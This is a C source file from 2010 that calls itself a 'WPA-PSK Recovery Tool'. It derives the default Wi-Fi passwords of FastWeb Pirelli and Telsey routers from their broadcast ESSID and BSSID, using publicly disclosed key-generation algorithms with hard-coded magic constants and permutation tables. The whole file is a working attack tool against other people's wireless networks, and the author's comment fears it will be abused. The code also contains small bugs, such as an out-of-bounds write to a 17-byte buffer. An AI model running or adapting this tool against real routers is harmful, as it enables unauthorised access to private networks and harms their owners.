/*
 * fastweb.c
 * 2010/09/16
 *
 * FastWeb Pirelli && Telsey WPA-PSK Recovery Tool
 * coded by mon@iwS, thanks to WHC for disclosure.
 *
 * usage: ./fastweb <essid> <bssid>
 *    eg: ./fastweb FASTWEB-1-00036F123456 00:03:6F:12:34:56
 *
 * supports every FastWeb Pirelli or Telsey router,
 * automagically detects the router class and generates one
 * or two PSK keys based on essid and/or bssid and
 * the proper algorithm.
 *
 * uses md5 and hashword libraries.
 *
 * i am against the publishing of code, but i've been
 * kindly asked to. therefore, here it is in its most
 * clean form, in the hope that won't become another
 * tool for the lamers. WH forums guys, behave...
 */

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>

#include "md5.h"        // pirelli
#include "hashword.h"   // telsey


#define printh(x)               \
{                               \
    int8_t i = 0;               \
    do {                        \
        printf("%02x", x[i]);   \
        i++;                    \
    } while (i < sizeof(x));    \
    putchar('\n');              \
}   // "most useful thing ever


// prototypes
void parseMacAddress(char *, uint8_t *);
uint8_t checkRouterClass(uint8_t *);
void createPirelliPSK(uint8_t *);
void createTelseyPSK(uint8_t *);


/* parses and extracts the mac address *
 * from essid and bssid, and puts it   *
 * into an unsigned char var.          */

void
parseMacAddress(char *m, uint8_t *mac)
{
    if(strlen(m) == 17) {
        mac[0] = (uint8_t)(strtoul(m+ 0, 0, 16) & 0xff);
        mac[1] = (uint8_t)(strtoul(m+ 3, 0, 16) & 0xff);
        mac[2] = (uint8_t)(strtoul(m+ 6, 0, 16) & 0xff);
        mac[3] = (uint8_t)(strtoul(m+ 9, 0, 16) & 0xff);
        mac[4] = (uint8_t)(strtoul(m+12, 0, 16) & 0xff);
        mac[5] = (uint8_t)(strtoul(m+15, 0, 16) & 0xff);
    } else {
        char w[17] ; w[2] = w[5] = w[8] = w[11] = w[14] = ':' ; w[17] = '\0';
        strncpy(w+ 0, m+10, 2); mac[0] = (uint8_t)(strtoul(w+ 0, 0, 16) & 0xff);
        strncpy(w+ 3, m+12, 2); mac[1] = (uint8_t)(strtoul(w+ 3, 0, 16) & 0xff);
        strncpy(w+ 6, m+14, 2); mac[2] = (uint8_t)(strtoul(w+ 6, 0, 16) & 0xff);
        strncpy(w+ 9, m+16, 2); mac[3] = (uint8_t)(strtoul(w+ 9, 0, 16) & 0xff);
        strncpy(w+12, m+18, 2); mac[4] = (uint8_t)(strtoul(w+12, 0, 16) & 0xff);
        strncpy(w+15, m+20, 2); mac[5] = (uint8_t)(strtoul(w+15, 0, 16) & 0xff);
    }

    return;
}


/* tests the parsed mac address against *
 * an array of OUIs to determine what   *
 * kind of router are we dealing with.  */
uint8_t
checkRouterClass(uint8_t *m)
{
    // taken from the OUI lookup tool on wireshark.org
    uint8_t pirelli[][3] = {
        { 0x00, 0x08, 0x27 },
        { 0x00, 0x13, 0xc8 },
        { 0x00, 0x17, 0xc2 },
        { 0x00, 0x19, 0x3e },
        { 0x00, 0x1c, 0xa2 },
        { 0x00, 0x1d, 0x8b },
        { 0x00, 0x22, 0x33 },
        { 0x00, 0x23, 0x8e },
        { 0x00, 0x25, 0x53 },
        { 0x38, 0x22, 0x9d },
        { 0x64, 0x87, 0xd7 }
    };

    uint8_t telsey[][3] = {
        { 0x00, 0x03, 0x6f },
        { 0x00, 0x21, 0x96 }
    };

    uint8_t i = 0;
    while(i < (sizeof(pirelli) / 3)) {
        if(!memcmp(m, pirelli[i], 3)) return 1;
        i++;
    }

    i = 0;
    while(i < (sizeof(telsey) / 3)) {
        if(!memcmp(m, telsey[i], 3)) return 2;
        i++;
    }

    return 0;
}


/* generates the PSK key for a Pirelli router *
 * using the algorithm described in the WHC   *
 * disclosure (see http://bit.ly/bB1kAP).     */
void
createPirelliPSK(uint8_t *mac)
{
    // magic constant
    uint8_t magic[20] = {
        0x22, 0x33, 0x11, 0x34, 0x02,
        0x81, 0xFA, 0x22, 0x11, 0x41,
        0x68, 0x11, 0x12, 0x01, 0x05,
        0x22, 0x71, 0x42, 0x10, 0x66
    };

    uint32_t bin = 0;
     uint8_t buffer[26], hash[16], psk[5];
      int8_t i = 0;

    // md5sum on the binary string serial+magic
    memcpy(buffer, mac, 6 );
    memcpy(buffer+6, magic, 20);
       md5(buffer, 26, hash);

    // binarize the 4 most-significative bytes of the hash
    for(i = 0; i < 3; i++) {
        bin = (bin | hash[i]) << 8;
    };  bin = (bin | hash[3]) >> 7;

    // hexize 5*5bit nibbles
    for(i = 4; i >= 0; i--) {
        psk[i] = (bin & 0x1F);
        bin >>= 5;
    }

    // sum 0x57 if the nibble is less or equal than 0xA
    for(i = 0; i < 5; i++) {
        if(psk[i] >= 0xA) psk[i] += 0x57;
    }

    printh(psk);

    return;
}


/* generates the PSK key for a Telsey router *
 * using the algorithm described in the WHC  *
 * disclosure (see http://bit.ly/91RPRr).    */
void
createTelseyPSK(uint8_t *mac)
{
    // this is critical: should s1 or s2 not be initialized to 0 everything goes to hell
    uint32_t rTable[64], s1 = 0, s2 = 0;
     uint8_t i, j;
     uint8_t pTable[256] = { // permutations index table
        6,2,1,6,2,1,2,6,5,3,4,3,5,4,3,3,3,5,3,1,3,6,4,2,1,5,1,2,2,5,2,1,
        3,5,3,3,4,2,4,5,5,2,5,4,6,2,6,6,3,2,1,6,2,1,2,2,5,3,2,4,4,4,6,3,
        5,5,6,5,6,2,5,1,3,6,1,6,3,2,4,6,6,3,3,5,3,4,2,5,1,5,5,4,4,1,6,4,
        5,4,1,1,4,3,2,2,3,2,3,6,2,4,5,4,1,3,4,5,1,1,3,3,1,1,1,6,2,2,2,5,
        5,1,3,3,4,4,4,1,1,3,5,2,6,6,6,1,1,5,6,1,2,2,6,3,3,3,6,2,4,4,3,4,
        2,1,3,5,2,6,3,6,1,2,5,1,2,2,2,5,3,3,3,3,4,4,4,4,6,5,1,2,5,1,6,6,
        2,1,6,1,1,2,6,2,3,3,5,3,4,5,5,4,5,4,2,6,6,6,2,5,4,1,2,6,4,2,1,5,
        5,3,3,6,5,4,4,2,3,5,4,1,3,4,6,2,4,2,3,4,6,1,2,3,6,4,5,2,1,3,4,1
    };

    // same as s1 and s2: 0x0 or hell breaks loose
    memset((void *)&rTable, 0x0, sizeof(rTable));

    // this loop permutates the mac address nibbles based on the pTable indexes
    for(i = 0; i < 64; i++) {
        for(j = 0; j < 4; j++) { // forming 4bytes sequences
            #ifdef L_ENDIAN  // in a little endian
            rTable[i] <<= 8;
            rTable[i] |= mac[pTable[(i*4)+j]-1];
            #else        // or a big endian fashion
            rTable[i] >>= 8;
            rTable[i] |= mac[pTable[(i*4)+j]-1] << 24;
            #endif
        }
    }

    // we now pass every 4byte sequence to hashword()
    for(i = 0; i < 64; ++i) {
        s1 = hashword(rTable, i, s1);
    };  s1 &= 0x000fffff; // we then extract the least significant 20bits from the hashword (s1)

    // we shift the 4bytes sequences according to our current index
    for(i = 0; i < 64; ++i) {
             if(i <  8) rTable[i] <<= 3;
        else if(i < 16) rTable[i] >>= 5;
        else if(i < 32) rTable[i] >>= 2;
           else         rTable[i] <<= 7;
    }

    // here we give the new 4bytes sequences to hashword
    for(i = 0; i < 64; ++i) {
        s2 = hashword(rTable, i, s2);
    };  s2 &= 0xfffff000; // and we extract the most significant 20bits from the hashword (s2)
        s2 >>= 12;

    printf("%05x%05x\n", s1, s2); // 20b s1 + 20b s2 = 5bytes psk key (10 chars)

    return;
}

int
main(int argc, char *argv[])
{
    switch(argc) {
        case 2: {
            char *essid  = argv[1];
            uint8_t tipo = 0;
            uint8_t eMac[6] = {
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00
            };

            parseMacAddress(essid, eMac);
            tipo += checkRouterClass(eMac);

            switch(tipo) {
                case 1:
                    createPirelliPSK(eMac);
                    break;
                case 2:
                    createTelseyPSK(eMac);
                    break;
                default: break;
            }

            return 0;
            break; // never reached
        }

        case 3: {
            char *essid  = argv[1];
            char *bssid  = argv[2];

            uint8_t tipo = 0;
            uint8_t eMac[6], bMac[6] = {
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00
            };

            // render essid and bssid in a usable uint8_t form
            parseMacAddress(essid, eMac);
            parseMacAddress(bssid, bMac);

            /* router type table explaination: we    *
             * use a var to tell us what are we      *
             * dealing with - every step adds a bit  *
             * in this way we have an unique number  *
             * for every case.                       *
             *                                       *
             *      pirelli = +1                     *
             *       telsey = +2                     *
             *  essid=bssid = +10                    *
             * essid!=bssid = +20                    *
             *   ^-pirelli| = +1                     *
             *    telsey -+ = *2                     *
             *                                       *
             * so we get:                            *
             * '11' for pirelli essid=bssid          *
             * '21' for pirelli essid!=bssid         *
             * '12' for telsey essid=bssid           *
             * '44' for telsey essid!=bssid          *
             * '42' for pirelli essid & telsey bssid *
             * '22' for telsey essid & pirelli bssid */

            if(!memcmp(eMac, bMac, 6)) {
                tipo += 10;
                tipo += checkRouterClass(eMac);
            } else {
                tipo += 20;
                tipo += checkRouterClass(eMac);
                tipo *= checkRouterClass(bMac);
            }

            switch(tipo) {
                case 11: createPirelliPSK(eMac);
                     break;

                case 21: createPirelliPSK(eMac);
                     createPirelliPSK(bMac);
                     break;

                case 12: createTelseyPSK(eMac);
                     break;

                case 44: createTelseyPSK(eMac);
                     createTelseyPSK(bMac);
                     break;

                case 42: createPirelliPSK(eMac);
                     createTelseyPSK(bMac);
                     break;

                case 22: createTelseyPSK(eMac);
                     createPirelliPSK(bMac);
                     break;

                default: break;
            }

            return 0;

            break; // never reached
        }

        default: break;
    }
}
